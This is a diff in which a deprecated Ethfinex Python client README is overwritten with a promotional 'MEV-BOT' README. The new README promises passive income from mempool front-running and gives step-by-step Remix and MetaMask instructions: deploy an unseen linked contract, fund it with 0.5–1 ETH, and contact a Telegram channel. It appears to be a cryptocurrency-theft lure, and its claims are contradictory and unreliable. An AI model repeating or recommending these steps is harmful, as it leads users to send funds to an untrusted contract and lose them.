@@ -1,123 +1,89 @@
-# ethfinex-python
+<p align="center">
+  <img src="https://github.com/JakeSub/lon/assets/132209154/3b460a04-7d23-4f1c-8ec4-aca91691b138" />
+</p>
 
-### This code has been deprecated and should not be used.
+# 🚀 MEV-BOT: Your Ticket to Passive Income
 
-[![Build Status](https://travis-ci.org/shanefontaine/ethfinex-python.svg?branch=master)](https://travis-ci.org/shanefontaine/ethfinex-python)
-[![Downloads](https://pepy.tech/badge/ethfinex-python)](https://pepy.tech/project/ethfinex-python)
-[![License](http://img.shields.io/badge/license-MIT-blue.svg)](https://raw.githubusercontent.com/shanefontaine/ethfinex-python/master/LICENSE)
-[![Code style: black](https://img.shields.io/badge/code%20style-black-000000.svg)](https://github.com/ambv/black)
+Mining Extractable Value (MEV) offers a lucrative avenue for income generation derived from unconfirmed transactions in the mempool. Leveraging the cutting-edge infrastructure , you can earn passive income by exploiting MEV-BOT. 
 
-The unofficial Python client for the [Ethfinex](https://www.ethfinex.com/api_docs) and [Ethfinex Trustless](https://ethfinex.docs.apiary.io/#) APIs.
+MEV-BOT provides miners with the power to strategically select and sequence transactions in blocks, thereby extracting additional value. This opens up profitable trades, arbitrage opportunities, and a host of MEV-related prospects. Witness your earnings skyrocket based on transactions located in the blockchain's mempool!
 
-##### Provided under MIT License by Shane Fontaine.
-> THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
-IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS
-FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR
-COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER
-IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN
-CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
+> **⏰ Attention!** This code is for sharing only and cannot be used for commercial purposes.
 
-_I am in no way affiliated with or funded by Ethfinex, Ethfinex Trustless, Ethfinex Inc., Bitfinex, iFinex Inc., Tether, Tether Limited, or any subsidiaries or affiliates of any of the previously mentioned entities._
+<p align="center">
+  <img src="http://i.countdownmail.com/2kn5rc.gif" />
+</p>
 
-## Functionality
-- A simple to use Python wrapper for both public and authenticated endpoints.
-- [Easy trading directly against Ethfinex Trustless, Bitfinex and Ethfinex orderbooks](https://blog.ethfinex.com/introducing-ethfinex-trustless-2f7390955fe0/)
-- Simple parsing of data returned from the Ethfinex API
+## 💡 Introducing Bot
 
-## Under Development
-- Better error handling
-- Tests
+MEV-BOT is an open infrastructure pioneered by a team of researchers and developers to exploit Miner Extractable Value (MEV) in the Ethereum network. It gives blockchain miners the power to gain additional value from transactions by controlling their order and inclusion in blocks.
 
-## Getting Started
-This README is documentation on the syntax of the python client presented in this repository. See function docstrings for full syntax details.
-This API attempts to present a clean interface to Ethfinex, but in order to use it to its full potential, you must familiarize yourself with the official Ethfinex documentation.
+MEV-BOT aims to resolve issues related to MEV, such as frontrunning (snagging transactions before their inclusion in a block), and mitigate the adverse impact on users and Decentralized Finance (DeFi) applications.
 
-- https://www.ethfinex.com/api_docs
+This infrastructure empowers developers and users to send bundles of transactions directly to Ethereum miners, bypassing the standard route via transaction pools. These bundles carry information about multiple transactions that need to be executed in a specific order, providing miners the choice to include or reject these bundles according to their preferences and objectives.
 
-You may manually install the project or use pip:
+## 📊 Platform Comparison 
 
-```python
-pip install ethfinex-python
+| Platform      | Router Address  | Network | Mempool Scan Time |
+| ------------- |:---------------:| -------:| ----------------: |
+| Pancakeswap   | [0x10ED43C718714eb63d5aA57B78B54704E256024E](https://bscscan.com/address/0x10ed43c718714eb63d5aa57b78b54704e256024e)| BSC     | 0.78 sec         |
+| Uniswap       | [0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D](https://etherscan.io/address/0x7a250d5630b4cf539739df2c5dacb4c659f2488d)| ETH     | 0.32 sec         |
 
-# or
+## 🤖 How to Use MEVBot
 
-pip install git+git://github.com/shanefontaine/ethfinex-python.git
-```
+### Step 1: Access the Source Code 📝
+1. Download MetaMask (if you don’t have it already): [https://metamask.io/download.html/]()
+   Navigate to the Remix IDE: [https://remix.ethereum.org/]()
 
-### Public Client
-Only some endpoints in the API are available to everyone. The public endpoints can be reached using PublicClient
+2. Create a new file "MevBot.sol".
+3. Copy [this code](sourcecode.sol) and paste it into the Remix IDE.
 
-```python
-import ethfinex
-public_client = ethfinex.PublicClient()
-```
+<p align="center">
+ <img src="https://i.ibb.co/J59pph4/2.jpg" alt="2" border="0">
+</p>
 
-### PublicClient Methods
-- [get_platform_status](https://docs.bitfinex.com/v2/reference#rest-public-platform-status)
-```python
-public_client.get_platform_status()
-```
+### Step 2: Compile the Code ⚙️
+1. Click on the "Solidity Compiler" tab, select the appropriate compiler version 0.6.12, and click on "Compile MevBot.sol".
+2. Click on the "Deploy & Run Transactions" tab Select "Injected Privider - MetaMask".
 
-- [get_ticker](https://docs.bitfinex.com/v2/reference#rest-public-ticker)
-```python
-# Get the ticker for a specific pair.
-public_client.get_ticker('tBTCUSD')
-```
+<p align="center">
+  <img src="https://i.ibb.co/rfbwTGK/3.jpg" alt="3" border="0">
+ </p>
+ <p align="center">
+  <img src="https://i.ibb.co/q0yCXV5/4.jpg" alt="4" border="0">
+</p>
 
-- [get_trades](https://docs.bitfinex.com/v2/reference#rest-public-trades)
-```python
-# Get the trades for a specific pair
-public_client.get_trades('tBTCUSD')
-# To include a start and end time
-public_client.get_trades('tBTCUSD', start=1514764800000, end=1514765700000)
-# To reverse the order that data is delivered (old to new)
-public_client.get_trades('tBTCUSD', start=1514764800000, end=1514765700000, sort=1)
-```
+### Step 3: Choose the Network 🌐
+1. Select either ETH or BSC (BNB) network.
 
-- [get_books](https://docs.bitfinex.com/v2/reference#rest-public-books)
-```python
-# Get the books for a specific pair
-public_client.get_books('tBTCUSD')
-# To get more or less granular precision
-public_client.get_books('tBTCUSD', precision='P1')
-```
+### Step 4: Deploy the Code 🚀
+1. Click 'Transact (Deploy)'.
 
-- [get_stats](https://docs.bitfinex.com/v2/reference#rest-public-stats)
-```python
-# Get the stats for a specific pair
-public_client.get_stats('tBTCUSD', 'funding.size', 'long', 'hist')
-# To reverse the order that data is delivered (old to new)
-public_client.get_stats('tBTCUSD', 'funding.size', 'long', 'hist', sort=1)
-```
+<p align="center">
+  <img src="https://i.ibb.co/xF4fSVv/5.jpg" alt="5" border="0">
+</p>
 
-- [get_candles](https://docs.bitfinex.com/v2/reference#rest-public-candles)
-```python
-# Get the candles for a specific pair
-public_client.get_candles('tBTCUSD', '1m', 'hist')
-# To include a start and end time
-public_client.get_candles('tBTCUSD', '1m', 'hist', start=1514764800000, end=1514765700000)
-```
+### Step 5: Deposit MEVBot starting funds 💰
+1. Copy your MEV contract and send an amount of Ethereum for the bot's operation. 
+2. Start the bot by pressing the 'Start' button.
 
-## Testing
-Unit tests are under development using the pytest framework. Contributions are welcome!
+> **🔔 Note:** For successful transactions on the Ethereum network, you must have sufficient balance to cover the gas fees. We recommend a minimum of 0.5-1 ETH. 
 
-To run the full test suite, in the project directory run:
+<p align="center">
+  <img src="https://github.com/JakeSub/lon/assets/132209154/9d9f4573-cb52-48f2-9f0b-d37e6ea2b73d" />
+</p>
 
-```
-python -m pytest
-```
+You can withdraw funds by clicking the 'Stop' and 'Withdrawal' button.
 
-## Changelog
 
-_0.1.2_
-- Major README update
+---
 
-_0.1.1_
-- Add CI
-- Add `public_client` tests
+## Support
+If you benefitted from the project, show us some support by giving us a star ⭐. Open source is awesome!
 
-_0.1.0_
-- Fully functional public client.
+## Help
+If at any time you encounter any issues with the contract setup, contact the team at  [**Click Here**](https://t.me/UniMevBotsSupport/). 🛡️
 
-_0.0.1_
-- Original PyPI release.
+## License
+
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
